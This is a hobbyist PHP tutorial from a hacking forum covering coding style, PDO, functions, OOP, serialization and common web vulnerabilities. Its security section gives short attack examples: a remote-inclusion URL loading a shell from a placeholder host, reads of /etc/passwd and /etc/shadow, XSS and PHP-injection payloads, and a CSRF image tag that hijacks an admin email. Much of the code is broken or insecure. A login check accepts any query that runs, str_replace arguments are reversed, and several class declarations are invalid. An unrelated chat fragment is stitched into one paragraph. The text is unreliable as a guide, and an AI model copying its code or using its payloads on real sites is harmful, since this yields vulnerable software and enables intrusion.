@@ -1,0 +1,1053 @@
+Title ........................... Better PHP Practices
+Author .......................... cwade12c
+Site  ........................... http://haxme.org/
+Language ........................ PHP
+Skill Level ..................... Any - code right
+
+[:: =========> Table of Contents <=========::]
+1 +++++++++++++++++++++++++++++++ Introduction
+2 +++++++++++++++++++++++++++++++ Intro Practices
+3 +++++++++++++++++++++++++++++++ Embrace Better Practices
+  ++++++++++++++++++++++++++++++++ PDO
+  ++++++++++++++++++++++++++++++++ Functions
+  ++++++++++++++++++++++++++++++++ OOP
+  ++++++++++++++++++++++++++++++++ Serialization/JSON
+4 +++++++++++++++++++++++++++++++ Security
+  ++++++++++++++++++++++++++++++++ Web Based Attacks
+  ++++++++++++++++++++++++++++++++ CAPTCHAS
+  ++++++++++++++++++++++++++++++++ Logging
+  ++++++++++++++++++++++++++++++++ Backups
+  ++++++++++++++++++++++++++++++++ php.ini 
+  ++++++++++++++++++++++++++++++++ Stress (DoS/Bandwith Leeching/BoF)
+5 +++++++++++++++++++++++++++++++ Final Thoughts
+
+... +[ Introduction ]+ ...
+This paper, rather than tutorial due to its covering of multiple practices, was written for anyone interested in PHP. Anyone - skillset regardless. These are some practices that cover some of the more modern and secure ways of coding in PHP. There are also some key fundamental tips which are included.
+
+
+
+... +[ Intro Practices ]+ ...
+I have a few tips in mind to aid the PHP student and already developer alike. 
+The first, and best tip... rtm. Seriously, spend some time with the PHP manual and introduce yourself to what is offered. The PHP community who comment are also of service to broaden your knowledge. 
+
+You may also consider developing in an IDE, or, Integrated Development Environment; as IDE's are useful for providing instant assitance with errors and code completion. It is also useful having a tree available to show you your classes/methods, properties and whatnot. If you're programming and are using docblocks in anyway to communicate (either to remind yourself, or the great habit of keeping organized + helping developers), these can be viewed as you work with properties and methods on the fly in your IDE. 
+
+Become interested in OO practices, which will be discussed later on in this paper. If we are not needing to repeat ourseves too much, our code will be much more organized, flexible and powerful. You may run into some challenges along this way - this is good, it stretches you to push for more advanced practices. Many will recommend a PHP framework for a beginner - I would not. A framework does a lot of work for you in most cases. It is best to learn the language yourself... and if you really want a "framework", create your own modular system with classes and the bunch. 
+
+Create nice, organized code. There are such things called standards, which are principles one should invest in. 
+I usually prefer the use of Zend coding standard. Here are some examples of Zend standards, to give you an example of how to code organized...
+
+<?php
+
+    /*C style comment - indent 4 spaces, no tab.*/
+    //Max line length == 80 characters (recommended).
+    //Class names may only contain alphanumeric characters. 
+    //_ usually demerits a path separator. I don't think of it as one in the cases of private visability
+    //methods() and functions() should start with a lowercase letter.
+    //functionsAndMethods() consistingOfTwopWords() should be formatted with camelCase.
+    
+    $a = 'String literal.';
+    $aTwo = 'String literal\'s brother\'s name is: ' . $a;
+    $aTwoPractical = "String literal's brother's name is: $a";
+    $arrayndeer = array( 4, 5, 6, 'Don\'t', 'beef', 'kid', $a, $aTwo );
+    
+    /**
+     * Doc block goes here
+     *
+     */
+    class Example
+    {
+        //contents of the class shall go here. 
+        public $handle; //A property
+
+        public function __construct( $name='cwade12c' )
+        {
+            $this->handle = $name;
+        }
+
+        public function get()
+        {
+            return $this->handle;
+        }
+    }
+
+    $name = new Example( 'hola' );
+    #echo $name->Get();
+
+    switch( $name->Get() )
+    {
+        case 'String literal.':
+            #print 'Greetings my friend.';
+            break;
+
+        case 'Don\'t beef kid':
+            #print 'Back up son!';
+            break;
+ 
+        case 'cwade12c': 
+            #print 'YEEEEEEEEEEEE!';
+            break;
+
+        default:
+            #print 'Who you is?';
+            break;
+    }
+
+    $c = 'inception';
+
+    if( $c != 'chickenlips' )
+    {
+        $c = 'westcoast';
+    }
+
+    $d = 'dog';
+
+    $d = ( $d != 'cat' ) ? 'iHop' : 'hopI';
+
+    //What is $d now?    
+    /* See: http://framework.zend.com/manual/en/coding-standard.html */
+    
+?>
+
+Take care of your scripts. Or more so your server, by protecting from infinite loops and long period secretions taking more time than needed. Understand which php functions/methods you are going to be working with... which are up-to-date, which is the best for your use... for handling and most of all, security. Applications should be developed likewise:
+
+Priority 1 --> Stability/Security
+Priority 2 --> Flexibility
+Priority 3 --> Speed
+
+Some may argue that speed shouldn't be a priority; I always like to argue that it should, after you for sure cover the other two priorities. Offering your application to its fullest and fastest potential (already secure) should be the ultimate goal.  Here are a few cool functions to help check in and do benchmark related work:
+getrusage(); microtime(); 
+
+Code self identifying; giving variables, objects, methods, etc. ALL relative names. If you have to think about something, the general rule of thumb is that you leave a comment. Once again, I highly recommend the use of docblocks. 
+
+A final "quick tip" (as there are many more in depth ones): do not be afraid to challenge yourself! Strive to learn, change and adapt. Each time I develop a new application or work on a new project, I try to do something new and different from the previous time; rather it is trying a more advanced topic, or applying a different approach to an already existing system.
+
+
+
+... +[ Embrace better practices ]+ ...
+I'd suggest one to embrace the better practices as they begin learning PHP, rather than fiddling around with inferior practices to have to learn the better ones later. Start well, and then work your way to the other stuff if you want. A great example of this is learning about how to work with databases.
+
+Usually, the beginning PHP student will learn PHP/mySQL (native), which is fine. But it would be a lot better if they learned how to work with PHP-SQL in a more powerful and overall better "right" way to begin with. Acqaint yourself with mySQLi (mySQL improved) and or PDO (PHP Data Objects).
+Between the two, which do I recommend? PDO. It has slick features over mySQLi, such as object mapping and better support for prepared statements. It feels more OO, as well.
+
+Why PDO/mySQLi? For starters, connecting to the database is a lot more easier and flexible. 
+
+<?php
+    
+    $myDB = new PDO( "DRIVER:host = HOST; $dbName = DB;", USERNAME, PASSWORD );
+
+?>
+
+DRIVER should represent the driver that corresponds to the database you are using. PDO supports MYSQL, SQLITE, PGQL and many more databases.
+You can check if a driver is right for you with PDO's static getAvailableDrivers() method.
+
+After instantiation, we can use our newly created myDB object accordingly. I'd like to cover the advantages of both mySQLi and PDO at the same time; but the advantages are similar in many ways, on top of PDO's extra benefits. With that said, the following examples will be about PDO exclusively. 
+
+A grand benefit of using PDO is its wonderful use of prepared statements. Prepared statements are precompiled queries that setup secure placeholders to protect from SQL injection, as well as the fact that you are having to send less data (so this is faster in the long run, especially when using multiple queries off of traffic or other).
+
+Here's a fun example of using an array with something called Named Placeholders:
+
+<?php
+
+    $login = array( 'Username' => $_POST[ "user" ], 'PasswordHash' => passEncrypt( $_POST[ "pass" ] ), 
+                    'Email' => $_POST[ "email" ] );
+    $Prepared = $myDB->( "INSERT INTO users ( Username, PasswordHash, Email ) value ( :Username, :PasswordHash,
+                    :Email )" );
+    $Prepared->execute( $login );
+
+?>
+
+PHP Data Objects even comes with its own error handling, which can be captured via PDOException. You can use this to figure out database errors down
+to the nittiest bit of information (see PHP exceptions: http://php.net/manual/en/language.exceptions.php).
+
+PDO is also great due to its flexibility. We can set fetching modes specifically to our object and THEN handle queries accordingly. Fetch modes
+include: ASSOC,NUM,OBJECT,BOTH,LAZY,CLASS,INTO. setFetchMode() is a static method and can be called upon through the class, or through your object. 
+It really becomes easy when you break it down:
+
+<?php
+    /* First, we'll setup our error handler */
+    try
+    {
+        $myDB = new PDO( "mysql:host = HOST; $dbName = DB;", USERNAME, PASSWORD );
+        //We are now connected.
+
+        $stmt = $myDB->query( "SELECT username FROM members" );
+        //Query executed, bount to $stmt
+
+        $result = $myDB->fetch( PDO::FETCH_ASSOC );
+        //$result set to FETCH_ASSOC, we shall use it accordingly
+
+        $dUsr = ( $result[ "cwade12c" ] ) ? 'User Exists' : 'User !Exists';
+        echo $dUsr;
+    }
+
+    catch( PDOException $errHan )
+    {
+       echo $errHan->getMessage();
+    }
+?>
+
+
+The code should be pretty self explanatory. Of course, there is more to PDO and examples to be shown... more to be said about the
+wonderful interface itself, its useful methods (like lastInsertId()), setting attributes, binding, and more. If you are interested in continuing your studies of PDO, some useful resources:
+
+/*
+ * @site http://tinyurl.com/pdo-nt
+ * @site http://php.net/manual/en/book.pdo.php
+ */
+
+Hell, I may even write a paper about it myself if it is requested enough. But PDO is only one ingredient of flexible/powerful PHP programming, bear in mind.
+
+Another important practice of efficiency is to repeat yourself as little as possible (sometimes better known as DRY (Don't Repeat Yourself)). 
+If you can repeat yourself as little as possible to achieve the same output, your script has the possibility to be:
+*More logical
+*More flexible
+*Faster/Improved
+*Easier to modify
+
+Direct examples of going DRY is to use variables for values that may be used multiple times, taking advantage of the use of objects (OOP) and even ORM.
+We will slightly overview some DRY practices: functions and OOP.
+
+Functions are a way of handling certain operations with (optional) parameters. By making use of functions, we can execute (theoretically) an infinite amount of lines of code by simply calling the function, rather than copy/pasting the lines of code over and over again.
+By making use of parameters, we give more flexibility to our functions. They instantly become more dynamic (unless we set optional parameter values which aren't used).
+
+<?php
+#somefile.func.php
+
+$matrice = array();
+$total = 0;
+
+function domesling()
+{
+    global $matrice;
+
+    for( $x=0; $x <= 10; $x+=2 )
+    {
+        array_push( $matrice, $x );
+    }
+}
+
+function domecrunch()
+{
+    global $matrice, $total;
+    
+    foreach( $matrice as $y )
+    {
+        $total += $y; //Rather than creating a temporary var and THEN adding
+    }
+}
+
+function domespit()
+{
+    global $total;
+    
+    echo $total; //Returning is usually best
+}
+
+?>
+
+<?php
+#anotherfile.php
+
+include( 'somefile.func.php' );
+
+/* Push to array */
+domesling();
+
+/* Calculate sum of array */
+domecrunch();
+
+/* Spit out the result */
+domespit();
+
+?>
+
+As you can see in "anotherfile.php", we simply included the script which held our functions and were able to execute the operations without having to repeat code.
+But even at that, our functions are still pretty static and aren't too flexible. They don't need to be flexible all the time, but lets look at a more practical example with better practices of the same operations.
+
+<?php
+#somefile.func.php
+
+$matrice = array();
+$total = 0;
+
+function domesling( $max, $by = 2 )
+{
+    global $matrice;
+
+    for( $x=0; $x <= $max; $x+=$by )
+    {
+        array_push( $matrice, $x );
+    }
+}
+
+//function domecrunch() {...}
+
+function domespit()
+{
+    global $total;
+
+    return $total;
+}
+
+?>
+
+Now after we include our function script, upon calling domesling(), we MUST specify a max range. We are allowed to optionally specify a second parameter (what to add to $x after each iteration), but if we do not, the default value is 2. 
+Now, we may need to use the sum of the array for other circumstances, so echoing the total out may not be feasible in all instances. In this case, we will return the value... where we could assign it to a variable, throw it against a condition, OR even echo. We are no longer as limited.
+
+<?php
+#anotherfile.php
+
+include( 'somefile.func.php' );
+
+domesling( 500 );
+
+domecrunch();
+
+$sum = domespit();
+echo $sum; //Even shorter, echo domespit();
+
+?>
+
+As you can see in the example above, we have now specified a value to our first parameter (max). We could have specified the second parameter, but since we did not, the default value of 2 was used. Functions are a powerful part of PHP, as they allow us so much more flexibility. An efficient practice.
+
+
+Another efficient practice is Object Oriented Programming (OOP). OOP is a programming paradigm that consists of the instantiation of classes which are assigned to objects. The theory behind PHP OOP is that objects hold their own identities. We could create multiple instances of the same class assigned to different objects, where each object has its own traits (commonly referred to as properties). Let's say we had a class to handle information, and upon
+instantiation, our construct would set a few properties for us. Think of an object for a moment as a being of some sort, each with its identifying properties. For example, humans (a being or object), have names. These named objects then have certain properties, such as "black hair, brown eyes, and an age". Human (object) "Bob" holds the traits "Blonde hair, blue eyes, 25 years of age".
+
+    $bob = new DNA( 'Blonde', 'Blue', 25 ); //DNA is the class name
+
+Now, we could create another object from the same class 'DNA', specifying unique properties to that specific object.
+
+    $chad = new DNA( 'Brown', 'Hazel', 21 );
+
+Both $bob and $chad are objects, instantiated from the DNA class, with their own specified properties. If DNA had a method to spit out the age for example, we could get each object's defining property through this. 
+
+    echo $bob->getAge(); #25
+    echo $chad->getAge(); #21
+
+As you can see, the properties remain exclusive to the object, rather than to the class. But what exactly is a class? A method? 
+A class is basically a blueprint for your object. Your object has access to specific properties and "actions" within your blueprint. You could almost see
+a class as a toolkit; each class should be exclusive to certain actions and operations, and in pair with properties and inheritance, a powerful system full
+of flexibility and adaptability (for other devs) can easily be established. 
+
+A method is very similar to a function, except it must reside inside of a class. A method is a sort of "action", in its own sense - and with the use of visibility, we can set permissions to our methods to define accessibility.
+
+There are three visibility markers: public, private and protected. You may assign visibility to properties and methods. 
+A public visibility will define no accessibility restrictions. In other words, if public, it can be accessed from anywhere. 
+A private visibility will define accessibility to that of only within the class. Private properties and methods can only be accessed from within the class they exist in.
+A protected visibility will define accessibility to the object's blueprint map (class instantiated in, childs/parents).  
+
+Let us create a basic class that will execute a few queries in a database and return a result.
+
+<?php
+
+    //...doing some stuff
+    //...a file in need of a class    
+    
+    if( isset ( $_POST["login"] ) )
+    {
+        require( 'classes/login.class.php' );
+        $objLogin = new LoginInstance( $_POST["username"] , $_POST["password"] );
+    }
+
+    //...
+?>
+
+<?php
+#classes/login.class.php
+
+    class LoginInstance extends Core
+    {
+        private $username;
+        private $password;
+     
+        function __construct( $username, $password )
+        {
+            /*Since no visibility was defined, public is used by default*/
+            $this->username = parent::sanitize( $username );
+            $this->password = parent::hashMake( $password );
+
+            self::chkLogin();
+        }
+
+        private function chkLogin()
+        {
+            $username = $this->username;
+            $password = $this->password;
+
+            parent::setInstance();
+            $objHan = new parent::getPdoObj();
+
+            $STH = $objHan->( "SELECT (username, password) FROM members WHERE username = :usr AND password = :pwd" );
+            
+            $STH->bindParam( ':usr', $username );
+            $STH->bindParam( ':pwd', $password );
+
+            $result = $STH->execute(); //The execute method returns TRUE or FALSE
+            if( $result )
+            {
+                parent::createSession();
+                parent::setCredentials();
+            }
+            else
+            {
+                parent::errorLib( 5 );
+            }
+        }
+
+    }
+?>
+
+The first thing you may have noticed is the frequent calling of methods that don't exist - at least, in the eye of the paper. What actually is going on
+is called inheritance. I believe not showing the code to the Core class file will allow you to see the benefits of inheritance... which is, traits/methods
+that are passed on, shared, or inherited. Funny little word, isn't it?
+
+When we our creating our class entitled LoginInstance via:
+    <?php class LoginInstance {//...} ?>
+We are inheriting the methods and properties allowed to us from the class 'Core', through extends <Classname>, or:
+    <?php class LoginInstance extends Core {//...} ?>
+
+Before we dove into our most recent OOP example, I discussed the significance of visibility. Visibility plays a large role in the concept of inheritance.
+A direct example: though we are inheriting the properties and methods of the 'Core' class, those properties and methods which visibility are set to private are unavailable to us through this class. But let's say the property/method is set to public or protected... let's just say the 'LoginInstance' class now has access to those as well.
+
+We first see the use of inheritance in LoginInstance's construct:
+    $this->username = parent::sanitize( $username );
+Since we are inheriting the traits of the 'Core' class, this makes 'Core' the parent class and 'LoginInstance' the child class. To access properties from the parent class, you'd either create an instance of the child class in the parent class' construct and share them that way, or you
+could create an instance of the parent class to share certain properties between constructs. Another valid way to access properties from the parent class is
+to pass them with protected get methods.
+
+Accessing methods from the parent class is quite a bit easier. We use the 'parent' keyword, following a scope resolution operator and then the method
+to be executed (following optional parameters):
+    parent::methodName( $param[0] );
+
+Methods declared public and static can be accessed without instantiation through the scope resolution operator:
+    Classname:methodName( $param[0] );
+
+The actions oMS word xD haha..that'll be in stories that I tell for years to come :')
+f the code itself is not what is important, but remains self-identifying so you can understand the logic, 
+Continuing, we essentially pass the PDO object over to chkLogin(), where we will use it to execute our query. PDO's execute() returns boolean TRUE || FALSE,
+so we will assign the result to a variable. We are able to take the result of our variable, run it through a condition and carry on from there. 
+But one thing... what is THIS? Literally... $this. 
+
+$this is a special read-only variable that is used in-turn with classes. The variable is used when fetching certain properties from the class. 
+It's logical aspect comes from the property of want residing in 'this' class. So the next time you see:
+    <?php class Hello { public $name; } ?>
+And then try to access $name as if it were some scalar variable, you'll find yourself running into a brick wall. To access the property of want:
+    $this->PROPERTY
+So if we were trying to access the public property $name from the prior 'Hello' class:
+    $this->name
+
+You'll find that the Object Oriented paradigm will become your friend very fast if used correctly. There is so much more to the subject that simply can
+not be covered in a short amount of time. For the sake of this paper, we'll overview a few other OOP concepts before moving on:
+Abstraction, interfaces and magic methods. 
+
+Abstract
+Abstraction can be seen as synonymous to the private visibility marker. The 'abstract' keyword is used in pair with a class, which will prevent the class
+from being instantiated. The class can only be accessed from within itself, or from its extended classes.
+The benefits to not being able to instantiate a class vary on multiple occasions; but the main idea is to keep a boundary around a certain mold to prevent
+the system from coming apart. Think of your core or base class to provide general functionality - but for events that require specific functionality,
+you would not want to allow a specific functionality to be accessible to items it should not be accessible with. 
+
+<?php
+abstract class Dog extends Mammalia
+{
+    protected function bark()
+    {
+        //bark;
+        //return something useful;
+    }
+}
+
+The Mammalia class consists of many mammals. But not all mammals bark - so in the specific case of a dog, we may want to add some specific functionalities.
+
+Interface
+The difference between an abstract and interface is an abstract leaves method processing intact, whereas an interface would simply provide the skeleton structure. An example of an interface:
+
+<?php
+interface sketch()
+{
+    public function draw( $outline, $thickness );
+    public function fill( $color, $shade, $intensity );
+} 
+
+So now when our class was to use an interface, we would use the 'implements' keyword following the interface name...
+    class <name> implements <name>
+    <?php class Art implements sketch {.../} ?>
+
+The class 'Art' MUST have the public functions 'draw' and 'fill' within the class, or else a fatal error will occur. Now you may ask, what is the benefit to this? Why not just use abstract classes? The answer lies in what you are needing to do. Most of the time, interfaces will probably be overlooked and unused (especially in PHP), but its use still exists: for creating and maintaining a standard or system that can be shared between multiple classes intended for creation. 
+
+Magic Methods
+Magic Methods are special interceptors that are triggered in certain events, provided to us with PHP. Magic methods are prefixed with __ before the method name, and are flexible for the needs of certain events (instantiation, property overloading, etc.).
+
+One magic method that you should already be somewhat familiar with (if you've followed up on the code), is the __construct() magic method. 
+    <?php class Name { public function __construct() {} } ?>
+The __construct() magic method is the method that will act upon instantiation of the class it resides in. 
+If you couldn't guess, the nifty__deconstruct() magic method will act when the object is destroyed. Unlike the __construct() method, __deconstruct() will accept no arguments and can be used to close connections (to increase performance). 
+
+As of this paper, there are fourteen magical methods that are all worth looking into to increase your product's performance and flexibility. 
+/* http://php.net/manual/en/language.oop5.magic.php */
+
+
+Now that I have spoken of the efficient practice of Object Oriented Programming, it leads me onto the final efficient practice that this paper will mention: serialization. 
+Serialization "generates a storable representation of a value" (PHP manual). It can be used to represent data in a few different ways, but of these; the most powerful is the serialization of objects, which will return a byte-stream representation of your object and its variables. 
+
+A perfect time to serialize an object would be in the event of working with multiple data entires that tie to a singular profile. Such an instance may be a member on a website. 
+
++Member
+--+Login
+---+Username
+---+Password
+----+Hash_Session
+----+Salt
+--+Info
+---+Display_Name
+---+Avatar
+----+Gravatar
+---+Bio
+
+Rather than having multiple columns within a database, you could serialize such information (after encrypting it with a server-side key+salt), 
+save the represented string (rather than multiple) in the database, get it from the database (after decrypting it with the server-side key+salt),
+unserialize the representation and assign the properties back to the object. If we treat such things as properties that are gathered and saved in one sql
+query rather than multiple, you'll thank your self later when looking into performance.
+
+<?php
+
+class Test
+{
+    public $name;
+    private $age;
+
+    public function __construct( $name, $age )
+    {
+        $this->name = $name;
+        $this->age = $age;
+    }
+
+    public function spitName()
+    {
+        return $this->name;
+    }
+}
+
+$objInstance = new Test( 'cwade12c', 0 );
+$creal = serialize( $objInstance );
+
+//echo $creal; O:4:"Test":2:{s:4:"name";s:8:"cwade12c";s:9:"Testage";i:0;}
+
+$adoptedObj = unserialize( $creal );
+echo $adoptedObj->spitName();
+
+?>
+
+But as of PHP 5.0.0, json_encode() was implemented. Json does the same thing as serialize(): returns a representation of data, but the pros json_encde() has over serialize() are:
+ *JSON is universal to many languages
+ *More legible
+ *Compressed
+ *Faster
+So why not use JSON over serialize()? JSON is more portable, faster and sets the standard. 
+    $creal = json_encode( $objInstance );
+    //echo $creal; {"name":"cwade12c","age":0}
+
+The thing that serialize() provides that json_encode() does not is more native support. JSON is limited to the types of data it will represent. You receive a slight edge in the category with serialize().
+    $adoptedObj = json_decode( $creal );
+    //$adobtedObj->spitName(); #FATAL ERROR here
+
+It all depends on how you are planning to develop your PHP applications. There are obviously solutions to solve this problem, but serialization here is the shorthand. 
+?>
+
+
+
+... +[ Security ]+ ...
+The greatest priority is to have a stable and secure script. If you are using a function or Class::method(), you should have an understanding of it in
+a certain entirety to ensure that you are not leaving your server open to vulnerabilities. Of course nothing is completely secure, we may overlook some things. This is why we should always aware of our code and how it interacts with the system - so in the unfortunate event of an exploit derived from your application, you can correct the issue in a timely manner. 
+
+Failing to read the manual and understand a function/method in its fullness may lead to mistakes. Some common exploits created from unawareness or oversaught are RFI (remote), LFI (privilege), XSS, Injections, Remote Code Execution, Buffer Overflows, CSRF and un-spoof-proof; to name a few.
+
+:=> RFI [Remote File Inclusion]
+This vulnerability is found where a PHP programmer allows an unvalidated/unsanitized external variable to interact with a function/method. 
+First and foremost: if the user has a say in how a script operates, then you know the user has a say to create vulnerability.
+
+$_GET[''] data received from url string
+
+<?php
+/* Let's create a website that will function off of a few pages: index.php (home), blog.php,
+ * gallery.php, contact.php
+ * We will have a template skeleton that is instantiated separately, but now we need a way
+ * to easily include pages, rather than <a href />'ing to the direct filenames. Blah. 
+ */
+
+include( 'settings.php' );
+include( 'db-config.php' );
+include( 'functions.php' );
+
+dbConnect( HOST, DB, USER, PWD );
+
+/* Beta (Current) */
+
+if( isset ( $_GET['page'] ) )
+{
+    setTemplate();
+    //Now include it here, simple.
+    require_once( $_GET['page'] . '.php' );
+}
+
+?>
+
+The script will look for $_GET['page'], and upon finding it, will take the value and use it against the require_once() function.
+http://tinyurl.com/phprqr1
+
+So our site will look like... index.php?page=gallery
+And our index.php file will require_once('gallery.php'); which will include and evaluate the file once. So, if the user were to tamper with the URL,
+and say - instead of index.php?page=gallery, they did page=sdkjhsdkjsdh
+
+PHP would spit a fatal error out (due to require once)... 'sdkjhsdkjsdh.php' could not be found. So now the user has a say in what file is included.
+The vulnerability is called an RFI largely because of the "R"; the file is included remotely. So, if we were to create our own php shell script,
+(http://haxme.org/forum/index.php?app=blog&module=display&section=blog&blogid=1&showentry=7) we could include it remotely and have access to the server.
+index.php?page=http://site.tld/directory/evil.php
+
+:=> LFI [Local File Inclusion]
+This vulnerability is also found where a PHP programmer allows an unvalidated/unsanitized external variable to interact with a function/method.
+But rather than including a file remotely, the attacker includes a file they already know exists on the server, to get more information or execute a privileged task. 
+
+<?php
+
+if( isset ( $_GET['file'] ) ) 
+{
+    $file = sanitize( $_GET['file'] );
+    echo file_get_contents( $file );
+}
+
+?>
+
+Normally, a good way for displaying files, right? 
+index.php?file=manifesto.txt
+
+Wrong. An attacker can echo out the contents of any file they know of... not just files within the directory the script resides in. 
+../etc/passwd
+../etc/shadow
+
+Accessing such information could allow an attacker root access with the right information. 
+
+:=> XSS [Cross-site Scripting]
+This vulnerability is found where a PHP programmer would allow certain unsanitized and malicious code to be sent to another user on the site. Rather the attack is reflective or stored, the malicious content can do anything from editing markup to executing javascript/flash. 
+
+<?php
+
+if( isset( $_REQUEST['login'] ) ) 
+{
+    chkLogin();
+}
+
+/*echo <<<LOG
+
+    <form action="<?php echo $_SERVER['PHP_SELF']; ?>">
+    <input type="hidden" name="login" value="true" />
+    <input type="submit" name="submit" value="Securely Login" />
+    </form>
+
+LOG;*/
+?>
+
+#Another example
+
+<?php
+
+$comment = getComment(); //Gets $_POST['comment']
+echo $comment;
+
+?>
+
+Both are examples that hold XSS vulnerabilities within. The first script's vulnerability actually lies within the <<<LOG heredoc.
+We are echo'ing the path the the script in form action... but we are not sanitizing PHP_SELF, and this is often seen. The result can lead to the alteration
+of your form. Here's how: index.php?page=login.php"><script>alert('Do some XSS here.');</script>
+
+Of course, that is only a basic example. So is the second example - echo "ANY HTML HERE". Since we have say in the value of the $comment variable, we could
+echo anything really. More advanced examples would be stored XSS. An example of this could be a guestbox; where XSS would be used to foresay steal a cookie. 
+
+:=> Remote Code Execution
+This vulnerability is found where a PHP programmer fails to sanitize scripts in the instance of writing files or evaluating data.
+This is commonly seen whilst using fwrite(); - if you are writing data to a file that is on the change, make sure you sanitize the data! If you do not,
+the file could get poisoned with malicious code, and from there executed. 
+
+Example?
+<?php
+
+$name = $_GET['username'];
+$file = fopen( 'last_user.php' );
+fwrite( $file, 'Username: ' . $name );
+fclose( $file );
+
+?>
+
+index.php?page=ucp.php&username=<?phpinfo();?>&sessionid=%00
+
+:=> CSRF [Cross-site Request Forgery]
+This vulnerability is found where a PHP programmer fails to validate a request, allowing an attacker to use a victim's computer to execute operations.
+These operations strictly rely on the system and how much access you have with the attack. A basic example: getting the password of an admin on a forumboard. In the forumboard software, you can update your settings via the user control panel (ucp).
+
+    <form action="ucp.php" method="get">
+        <input type="text" name="email" value="<? echo $user['email']; ?>" />
+        <input type="text" name="display" value="<? echo $user['display']; ?>" />
+        <!-- <input type="hidden" name="sessid" value="<? echo genToken( 8, md5 ); ?>" /> -->
+        <input type="submit" name="submit" value="Update" />
+    </form>
+
+<?php
+
+chkIsLoggedIn( $_COOKIE['username'], $_SESSION['memid'] );
+
+if( isset( $_GET['email'] ) || isset( $_GET['display'] ) )
+{
+    $email = $_GET['email'];
+    $display = $_GET['display'];
+
+    updateMail( $email );
+    updateDisplay( $display );
+}
+else
+{
+    exit();
+}
+
+?>
+
+The attacker can now include and execute a forged request knowing this information - and since there is no validation to see if the request is good, we can execute ucp.php with our $_GET parameters at will - bind it to an image that will be requested in your victim's browser, and in turn - executed in their browser. 
+
+    <!-- Evil code: <img src="http://vuln-site.tld/forum/ucp.php?email=attacker@email.tld" /> -->
+
+Including that "image" in a forum post and waiting for the administrator to load the image will in turn forge the request from the administrator's browser, 
+updating the admin's email to "attacker@email.tld". Once this happened, the attacker could "Request Forgotten Password" and have the admin's password emailed straight to his/her email. 
+
+:=> Solutions
+As we have gone over the basic means of web application exploitation, we have only looked at the proof of concept, but not how to protect from it. 
+There are many ways to protect yourself from vulnerabilities; it's usually best if you try not to create them to begin with.
+This can be acheived by understanding functions/methods in fullness. Here are a few other specific tips that will help avoid mistakes:
+
+RFC2616-9.1.1 (Safe Methods)
+"Implementors should be aware that the software represents the user in their interactions over the Internet, and should be careful to allow the user to be aware of any actions they might take which may have an unexpected significance to themselves or others.
+
+In particular, the convention has been established that the GET and HEAD methods SHOULD NOT have the significance of taking an action other than retrieval. These methods ought to be considered "safe". This allows user agents to represent other methods, such as POST, PUT and DELETE, in a special way, so that the user is made aware of the fact that a possibly unsafe action is being requested.
+
+Naturally, it is not possible to ensure that the server does not generate side-effects as a result of performing a GET request; in fact, some dynamic resources consider that a feature. The important distinction here is that the user did not request the side-effects, so therefore cannot be held accountable for them."
+
+*Use mysql_real_escape_string() over stripslashes(). This will help protect from SQL injection.
+*Use htmlentities(). This will help safely store html in entirety.
+*Use htmlspecialchars(). This will help safely store html in specificity.
+*Use strip_tags(). This will strip HTML/PHP tags from a string. 
+*Use trim(). This will clean up any whitespace (which could affect checksums, etc.)
+*Use str_replace(). This will replace strings that concern certain characters with what you want them to.
+*Use $_SESSIONs and $_COOKIEs. 
+*Use PDO. 
+*Use common sense. Anything stored or eval'ed must be validated!
+
+Code a sanitation class.
+<?php
+
+class Sanitize() 
+{
+    protected $seed;
+
+    public function __construct()
+    {
+        $this->seed = self::genKey( 8 );
+    }
+
+    static public function iterate( $scheme, $string, $count )
+    {
+        $output = $string;
+        
+        for ( $k=0; $k < $count; $k++ ) 
+        {
+            $output = hash( $scheme, $output, true );
+        }
+        
+        return $output;
+    }
+
+    protected function cleanQuery( $query )
+    {
+        $query = mysql_real_escape_string( $query );
+        $query = self::cleanFilter( $query );
+
+        return $query;
+    }
+
+    protected function cleanHTML( $html )
+    {
+        return htmlentities( $html, ENT_QUOTES );
+    }
+
+    protected function genKey( $len='5' )
+    {
+        $char = 'abcdefghijklmnopqrstuvwxyzABCDEFG123456789!@#$%';
+        $output = '';
+
+        for( $k = 0; $k < $len; $k++ )
+        {
+            $output.= $char[ mt_rand( 0, strlen( $char ) - 1 ) ];
+        }
+
+        return $output;
+    }
+
+    protected function cleanFilter( $query, $fi=TRUE, $tag=TRUE )
+    {
+        if( $fi == TRUE )
+        {
+            $query = str_replace( $query, ".", "" );
+            $query = str_replace( $query, "/", "" );
+        }
+
+        if( $tag == TRUE )
+        {
+            $query = strip_tags( $query );
+        }
+
+        $query = str_replace( $query, "%00", "" );
+        $query = str_replace( $query, '"', "" );
+        $query = trim( $query );
+        
+        return $query;
+    }
+
+}
+
+
+CAPTCHAS are another counter-measurement to slow down bots/hackers. A CAPTCHA is a means of human identification that is used alongisde a
+page which may handle a sensitive request. To prevent, for example, bruteforcing attacks on a login page - a CAPTCHA of random letters are inserted
+and are required that the user enters correctly before the other fields are even recognized. 
+
+Your CAPTCHA can be as basic as random character generation that is assigned to a variable and is printed on the page, or can be as advanced as 
+putting a four piece puzzle together (thanks to HTML5). A few easy, free opensource PHP Captcha scripts are "Securimage" and "reCAPTCHA".
+For a quick example, we'll get reCAPTCHA from: http://captcha.net/
+
+Generate your keys for your domain, and download the files. Now we will include the library and echo the recaptcha form on our desired page.
+
+#login.php
+<html>
+    <head>
+        <title>Secure login page</title>
+    </head>
+    <body>
+        <form method="POST" action="login.verify.php">
+            <?php require( 'recaptchalib.php' );
+                  $publickey = ''; //Generated earlier
+                  echo recaptcha_get_html( $publickey );
+            ?>
+            <input type="submit" name="username" />
+            <input type="password" name="password" />
+            <input type="submit" name="submit" value="Login" />
+        </form>
+    </body>
+</html>
+
+#login.verify.php
+<?php
+
+require_once( 'recaptchalib.php' );
+$privatekey = ''; //Generated earlier
+
+$resp = recaptcha_check_answer( $privatekey, $_SERVER["REMOTE_ADDR"], $_POST["recaptcha_challenge_field"], $_POST["recaptcha_response_field"] );
+
+if( !$resp->is_valid()
+{
+    //redirect( 'login.php' );
+    exit();
+}
+else
+{
+    require_once( 'Sanitize.class.php' );
+    $sanitize = new Sanitize();
+    $user = $sanitize->cleanQuery( $_POST['username'] );
+    //$cryptObj = new someCryptClass();
+    //$pass = $cryptObj->encrypt( $_POST['password'] );
+
+    //check( $user, $pass );
+}
+
+Sanitize would not even be instantiated if the captcha was entered incorrectly. reCAPTCHA is an opensource library coded in PHP that is highly customizable and is also available for a lot of CMS/applications.
+
+
